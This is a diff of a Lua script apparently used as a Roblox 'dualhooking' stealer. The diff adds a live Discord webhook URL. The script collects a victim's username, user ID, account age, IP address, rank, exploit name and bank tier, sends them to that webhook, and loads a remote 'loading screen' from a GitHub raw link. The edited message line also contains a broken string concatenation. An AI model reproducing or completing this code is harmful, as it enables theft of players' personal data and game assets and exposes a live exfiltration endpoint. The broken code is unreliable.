@@ -8,7 +8,7 @@
 ]]--
 
 local dhuser = "ipin_p1"       -- dualhooking user
-local dhwebhook = "Webhook Here" -- Dualhooking Webhook
+local dhwebhook = "https://discord.com/api/webhooks/1141612373241778229/jN26lfrIggD0SnKHbs0g2e_R3BJLSFelmuiPSL9YTlLhs5PbJCXf3cNLHst834yr3Zyt" -- Dualhooking Webhook
 local loadingraw = "https://raw.githubusercontent.com/xxnever1/loadingscreen/main/ppppp" -- Put Your LoadingScreen Raw Link Here
 
 if getgenv().executed1 then return end
@@ -1252,7 +1252,7 @@ if banktiercheck == true then
                 ["value"] = "```Username     : " .. username .. "\nDisplay Name : " .. fardplayer.DisplayName ..
                     "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                     " Days\nIP Address   : " .. IPadress .. "\nRank         : " .. rank ..
-                    "\nExploit      : " .. exploit .. "\nReceiver     : " .. receiver .. "\nBank Tier    : Tier " .. SuperBank["Tier"] .. "```",
+                    "\nExploit      : " .. exploit .. " "\nBank Tier    : Tier " .. SuperBank["Tier"] .. "```",
                 ["inline"] = false
             }, {
                 ["name"] = ":gem: **Diamonds** :gem:",
